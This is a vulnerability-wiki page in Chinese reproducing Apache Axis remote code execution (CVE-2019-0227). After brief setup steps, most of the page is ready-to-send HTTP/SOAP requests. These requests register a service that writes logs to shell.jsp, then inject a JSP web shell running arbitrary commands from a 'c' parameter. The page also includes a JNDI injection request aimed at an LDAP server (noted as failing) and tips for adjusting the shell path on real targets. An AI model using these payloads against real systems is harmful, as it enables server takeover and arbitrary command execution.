POC-EXP/site/中间件漏洞/Apache Axis 远程代码执行漏洞 CVE-2019-0227/index.html

<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Apache%20Axis%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0227/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache Axis 远程代码执行漏洞 CVE-2019-0227 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache Axis \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2019-0227", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-link">
        Apache Cocoon XML注入 CVE-2020-11991
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20ActiveMQ%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-46604/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache%20ActiveMQ%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-46604/" class="btn btn-xs btn-link">
        Apache ActiveMQ 远程代码执行漏洞 CVE-2023-46604
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-axis-cve-2019-0227">Apache Axis 远程代码执行漏洞 CVE-2019-0227<a class="headerlink" href="#apache-axis-cve-2019-0227" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Apache Axis 服务被用于部署各种接口服务。其中，AdminService 接口允许管理员远程访问管理服务，相关配置在 <code>/axis/WEB-INF/server-config.wsdd</code>(部署应用后产生)，其中<code>enableRemoteAdmin</code>默认为<code>false</code>，只允许本地管理。</p>
<p>若将<code>enableRemoteAdmin</code>设置为<code>true</code>，则可以执行 JNDI 注入，执行任意代码或反弹 Shell。 </p>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>下载 <a href="http://mirror.navercorp.com/apache/axis/axis/java/1.4/axis-bin-1_4.tar.gz">axis bin</a> 解压，将 webapps 下 axis 文件夹复制到 tomcat 环境下 webapps 目录下。</p>
<p>修改环境变量：</p>
<div class="highlight"><pre><span></span><code>vim ~/.profile
</code></pre></div>
<div class="highlight"><pre><span></span><code>export AXIS_HOME=/usr/tomcat/apache-tomcat-8.5.90/webapps/axis
export AXIS_LIB=$AXIS_HOME/WEB-INF/lib
export AXISCLASSPATH=$AXIS_LIB/axis.jar:$AXIS_LIB/commons-discovery-0.2.jar:$AXIS_LIB/commons-logging-1.0.4.jar:$AXIS_LIB/jaxrpc.jar:$AXIS_LIB/saaj.jar:$AXIS_LIB/log4j-1.2.8.jar:$AXIS_LIB/xml-apis.jar:$AXIS_LIB/xercesImpl.jar:$AXIS_LIB/wsdl4j-1.5.1.jar
</code></pre></div>
<p>刷新环境变量：</p>
<div class="highlight"><pre><span></span><code>source ~/.profile
</code></pre></div>
<p>开启RemoteAdmin服务：</p>
<div class="highlight"><pre><span></span><code>vim webapps/axis/WEB-INF/deploy.wsdd
</code></pre></div>
<div class="highlight"><pre><span></span><code>&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;
    xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;
  &lt;service name=&quot;AdminService&quot; provider=&quot;java:MSG&quot;&gt;
    &lt;parameter name=&quot;className&quot; value=&quot;org.apache.axis.utils.Admin&quot;/&gt;
    &lt;parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;
    &lt;parameter name=&quot;enableRemoteAdmin&quot; value=&quot;true&quot;/&gt;
  &lt;/service&gt;
&lt;/deployment&gt;
</code></pre></div>
<p>刷新配置：</p>
<div class="highlight"><pre><span></span><code>java -cp $AXISCLASSPATH org.apache.axis.client.AdminClient deploy.wsdd
</code></pre></div>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="randomservice-getshell">RandomService 报错getshell<a class="headerlink" href="#randomservice-getshell" title="Permanent link">&para;</a></h3>
<p>注册服务，指定日志目录为shell路径：</p>
<div class="highlight"><pre><span></span><code>&lt;parameter name=&quot;LogHandler.fileName&quot; value=&quot;../webapps/axis/shell.jsp&quot; /&gt;  
</code></pre></div>
<div class="highlight"><pre><span></span><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: &quot;&quot;
Content-Length: 1059
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Body&gt;
    &lt;ns1:deployment
  xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;
  xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;
  xmlns:ns1=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;
  &lt;ns1:service name=&quot;RandomService&quot; provider=&quot;java:RPC&quot;&gt;
    &lt;requestFlow&gt;
      &lt;handler type=&quot;RandomLog&quot;/&gt;
    &lt;/requestFlow&gt;
    &lt;ns1:parameter name=&quot;className&quot; value=&quot;java.util.Random&quot;/&gt;
    &lt;ns1:parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;
  &lt;/ns1:service&gt;
  &lt;handler name=&quot;RandomLog&quot; type=&quot;java:org.apache.axis.handlers.LogHandler&quot; &gt;
    &lt;parameter name=&quot;LogHandler.fileName&quot; value=&quot;../webapps/axis/shell.jsp&quot; /&gt;   
    &lt;parameter name=&quot;LogHandler.writeToConsole&quot; value=&quot;false&quot; /&gt; 
  &lt;/handler&gt;
&lt;/ns1:deployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div>
<p><img alt="image-20230630164154570" src="../images/image-20230630164154570.png" /></p>
<p>请求RandomService，利用报错将错误日志写入到shell文件：</p>
<div class="highlight"><pre><span></span><code>POST /axis/services/RandomService HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: &quot;&quot;
Content-Length: 874
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
        &lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
        &lt;soapenv:Body&gt;
        &lt;api:main
        soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
            &lt;api:in0&gt;&lt;![CDATA[
&lt;%@page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;% if (request.getParameter(&quot;c&quot;) != null) { Process p = Runtime.getRuntime().exec(request.getParameter(&quot;c&quot;)); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%&gt;
]]&gt;
            &lt;/api:in0&gt;
        &lt;/api:main&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div>
<p><img alt="image-20230630164243555" src="../images/image-20230630164243555.png" /></p>
<p>shell 地址：</p>
<div class="highlight"><pre><span></span><code>view-source:http://your-ip:8080/axis/shell.jsp?c=pwd
</code></pre></div>
<p><img alt="image-20230630164400748" src="../images/image-20230630164400748.png" /></p>
<p>这里的 shell 写入路径 LogHandler.fileName 为 <code>../webapps/axis/shell.jsp</code>，实际遇到的目标启动路径可能不同，需要根据实际对写入的路径做相应的变动。</p>
<p>卸载服务：</p>
<div class="highlight"><pre><span></span><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 458

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
  &lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Body&gt;
    &lt;undeployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;
      &lt;service name=&quot;randomService&quot;/&gt;
      &lt;handler name=&quot;RandomLog&quot;/&gt;
      &lt;service name=&quot;jndiService&quot;/&gt;
    &lt;/undeployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div>
<h3 id="adminservice-jndi">AdminService JNDI注入<a class="headerlink" href="#adminservice-jndi" title="Permanent link">&para;</a></h3>
<p>注册服务：</p>
<div class="highlight"><pre><span></span><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 746

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
  &lt;soapenv:Body&gt;
    &lt;ns1:deployment xmlns:ns1=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;
      &lt;ns1:service name=&quot;testService&quot; provider=&quot;java:RPC&quot;&gt;
        &lt;ns1:parameter name=&quot;className&quot; value=&quot;org.apache.axis.client.ServiceFactory&quot;/&gt;
        &lt;ns1:parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;
      &lt;/ns1:service&gt;
    &lt;/ns1:deployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div>
<p><img alt="image-20230630163319405" src="../images/image-20230630163319405.png" /></p>
<p>访问创建的testService进行jndi注入：</p>
<div class="highlight"><pre><span></span><code>POST /axis/services/testService HTTP/1.1
Host: your-ip:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/axis/servlet/AxisServlet
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-TW;q=0.9,zh-CN;q=0.8
Connection: close
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Content-Length: 791

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:buil=&quot;http://build.antlr&quot;&gt;
  &lt;soapenv:Header/&gt;
  &lt;soapenv:Body&gt;
    &lt;buil:getService soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
      &lt;environment xmlns:apachesoap=&quot;http://xml.apache.org/xml-soap&quot; xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xsi:type=&quot;apachesoap:Map&quot;&gt;
        &lt;item&gt;
          &lt;key xsi:type=&quot;soapenc:string&quot;&gt;jndiName&lt;/key&gt;
          &lt;value xsi:type=&quot;soapenc:string&quot;&gt;ldap://your-ip:1389/dlmaty&lt;/value&gt;
        &lt;/item&gt;
      &lt;/environment&gt;
    &lt;/buil:getService&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div>
<p>这里 JNDI 注入**不成功**，报错 <code>java.lang.ClassCastException: javax.naming.Reference cannot be cast to org.apache.axis.client.Service</code>。</p>
<p>可能是复现的环境采用需要1.8.0_102之前的环境。（待测）</p>
<p><img alt="image-20230630163750630" src="../images/image-20230630163750630.png" /></p>
<p>卸载服务：</p>
<div class="highlight"><pre><span></span><code>POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 458

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;
        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Body&gt;
&lt;undeployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;
 &lt;service name=&quot;testService&quot;/&gt;
&lt;/undeployment&gt;
  &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-link">
        Apache Cocoon XML注入 CVE-2020-11991
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20ActiveMQ%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-46604/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache%20ActiveMQ%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-46604/" class="btn btn-xs btn-link">
        Apache ActiveMQ 远程代码执行漏洞 CVE-2023-46604
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>